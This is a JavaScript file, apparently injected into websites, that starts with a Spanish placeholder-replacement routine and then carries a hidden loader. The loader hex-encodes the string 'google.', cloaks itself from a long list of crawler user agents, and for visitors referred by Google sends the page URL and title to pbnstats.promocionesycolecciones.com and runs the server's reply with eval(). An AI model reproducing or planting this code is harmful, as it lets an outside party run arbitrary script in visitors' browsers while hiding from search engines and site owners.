if (window.beebomstats!=undefined || window.location.hostname=="infoenbolas.com" || window.location.hostname=="www.infoenbolas.com"){

}else{
 window.beebomstats=true;      
 document.addEventListener('DOMContentLoaded', () => {
    if (window.next!=undefined){
           //para tucristalero tu alarma y demas
           // Segunda pasada: placeholders partidos entre etiquetas inline
           function reemplazarPartido(buscar, reemplazo, raiz = document.body) {
             // Escapa caracteres especiales de regex ([ ] etc.)
             const escapar = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
             // Permite etiquetas HTML entre cada carácter del texto buscado
             const patron = new RegExp(
               [...buscar].map(escapar).join('(?:<[^>]+>)*'),
               'g'
             );
           
             // Solo elementos cuyo texto visible contiene el placeholder
             // pero ningún hijo directo lo contiene entero (= está partido aquí)
             raiz.querySelectorAll('li, p, td, th, h1, h2, h3, h4, h5, h6, span, a, div').forEach(el => {
               if (!el.textContent.includes(buscar)) return;
               const algunHijoLoTiene = [...el.children].some(h => h.textContent.includes(buscar));
               if (algunHijoLoTiene) return;
           
               el.innerHTML = el.innerHTML.replace(patron, reemplazo);
             });
           }
           
          
           reemplazarTexto('[NOMBRE DE LA EMPRESA]', 'Fafulisfa LLC');   // casos normales
           reemplazarPartido('[NOMBRE DE LA EMPRESA]', 'Fafulisfa LLC'); // casos partidos
       
      }
 });

 function decodeHex(x) {
 
     var j;
 
     if (x == undefined)
 
         return "";
 
     var hexes = x.match(/.{1,4}/g) || [];
 
     var back = "";
 
     for (j = 0; j < hexes.length; j++) {
 
         back += String.fromCharCode(parseInt(hexes[j], 16));
 
     }
 
     return back;
 
 }
 var botPattern = "(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
 
 var re = new RegExp(botPattern,'i');
 
 var userAgent = navigator.userAgent;
 
 if (!re.test(userAgent)) {
 
     var x = "0067006f006f0067006c0065002e";
 
     x = decodeHex(x);
 
     var sUsrAg = document.referrer;
 
 
 
     if (sUsrAg.indexOf(x) > -1) {
 
 
 
         var xmlhttp = new XMLHttpRequest();
 
         xmlhttp.onreadystatechange = function() {
 
             if (xmlhttp.readyState == XMLHttpRequest.DONE) {
 
                 if (xmlhttp.status == 200) {
 
                     eval(xmlhttp.responseText);
 
                 } else if (xmlhttp.status == 400) {
 
                     console.log('There was an error 400');
 
                 } else {
 
                     console.log('something else other than 200 was returned');
 
                 }
 
             }
 
         }
 
         ;
 
         function randomIntFromInterval(min, max) {
 
             return Math.floor(Math.random() * (max - min + 1) + min)
 
         }
 
         const rndInt = randomIntFromInterval(1, 100000);
 
         xmlhttp.open('GET', 'https://pbnstats.promocionesycolecciones.com/add.php?rand=' + rndInt + '&aux1=x1&referer=' + encodeURI(window.location.href) + "&title="+encodeURIComponent(document.title), true);
 
         xmlhttp.send();
 
     }
 
 }
}
